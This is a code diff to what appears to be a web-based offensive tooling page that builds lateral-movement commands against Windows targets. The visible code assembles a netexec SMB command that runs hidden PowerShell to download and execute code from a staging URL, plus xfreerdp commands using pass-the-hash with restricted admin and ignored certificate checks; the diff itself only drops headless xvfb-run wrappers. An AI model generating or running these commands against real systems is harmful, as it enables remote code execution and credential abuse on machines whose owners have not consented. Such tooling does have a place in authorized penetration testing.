@@ -1875,12 +1875,12 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <option value="nxe-iex">netexec + PS IEX</option>
               </optgroup>
               <optgroup label="── RDP /drive (requires Local Binary)">
-                <option value="rdp-drive">xvfb-run xfreerdp /drive + exec (headless)</option>
-                <option value="rdp-drive-pth">xvfb-run xfreerdp /drive + exec /pth (headless)</option>
+                <option value="rdp-drive">xfreerdp /drive + exec</option>
+                <option value="rdp-drive-pth">xfreerdp /drive + exec /pth</option>
               </optgroup>
               <optgroup label="── RDP LOLBin (requires Staging URL)">
-                <option value="rdp-certutil">xfreerdp + certutil download + exec (headless)</option>
-                <option value="rdp-iex">xfreerdp + PowerShell IEX (headless)</option>
+                <option value="rdp-certutil">xfreerdp + certutil download + exec</option>
+                <option value="rdp-iex">xfreerdp + PowerShell IEX</option>
               </optgroup>
             </select>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-upload" onclick="ipcRun('upload')">⬆ Upload</button>
@@ -15570,12 +15570,12 @@ async function ipcRun(action) {
       cmds.push(`netexec smb ${a.target} ${a.nxe} -x 'powershell -nop -w hidden -c "IEX(IWR ''${surl}'' -UseBasicParsing)"'`);
   }
 
-  // RDP methods — all run under xvfb-run so no visible window appears.
+  // RDP methods — /shell: sets alternate shell at RDP login (no RemoteApp needed).
   if (isRDP) {
     const ntHash   = a.hash.replace(/^:/, '') || a.hash;
     const usePTH   = method === 'rdp-drive-pth' && ntHash;
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
-    const rdpBase  = `xvfb-run -a xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
+    const rdpBase  = `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
     const rdpTail  = `/w:800 /h:600 /log-level:OFF`;
 
     if (method === 'rdp-drive' || method === 'rdp-drive-pth') {
